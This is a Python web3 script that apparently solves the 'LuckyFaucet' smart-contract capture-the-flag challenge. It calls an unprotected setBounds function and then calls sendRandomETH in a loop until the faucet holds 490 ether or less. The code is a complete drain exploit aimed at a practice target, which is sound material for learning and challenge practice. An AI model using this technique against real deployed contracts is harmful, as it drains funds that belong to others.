from web3 import Web3


abi_contract = '''[
        {
            "type": "constructor",
            "inputs": [],
            "stateMutability": "payable"
        },
        {
            "type": "function",
            "name": "lowerBound",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "int64",
                    "internalType": "int64"
                }
            ],
            "stateMutability": "view"
        },
        {
            "type": "function",
            "name": "sendRandomETH",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "bool",
                    "internalType": "bool"
                },
                {
                    "name": "",
                    "type": "uint64",
                    "internalType": "uint64"
                }
            ],
            "stateMutability": "nonpayable"
        },
        {
            "type": "function",
            "name": "setBounds",
            "inputs": [
                {
                    "name": "_newLowerBound",
                    "type": "int64",
                    "internalType": "int64"
                },
                {
                    "name": "_newUpperBound",
                    "type": "int64",
                    "internalType": "int64"
                }
            ],
            "outputs": [],
            "stateMutability": "nonpayable"
        },
        {
            "type": "function",
            "name": "upperBound",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "int64",
                    "internalType": "int64"
                }
            ],
            "stateMutability": "view"
        }
]'''

abi_setup = '''[
        {
            "type": "constructor",
            "inputs": [],
            "stateMutability": "payable"
        },
        {
            "type": "function",
            "name": "TARGET",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "address",
                    "internalType": "contract LuckyFaucet"
                }
            ],
            "stateMutability": "view"
        },
        {
            "type": "function",
            "name": "isSolved",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "bool",
                    "internalType": "bool"
                }
            ],
            "stateMutability": "view"
        }
]'''

w3 = Web3(Web3.HTTPProvider('http://83.136.251.7:51464'))
contract = w3.eth.contract(address='0x46BAEBcd82eDd953f597845c2e0d51E9BF4CE6c8', abi=abi_contract)
setup = w3.eth.contract(address='0x89388b4c8F794853994Ef1ec14B12E8a66f8469e', abi=abi_setup)


contract.functions.setBounds(0, 10_000_000).transact()

while True:
    is_solved = setup.functions.isSolved().call()
    if is_solved:
        print("LuckyFaucet balance is 490 ether or less! Challenge solved.")
        break
    else:
        tx_hash = contract.functions.sendRandomETH().transact()
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print("Sending random ETH...")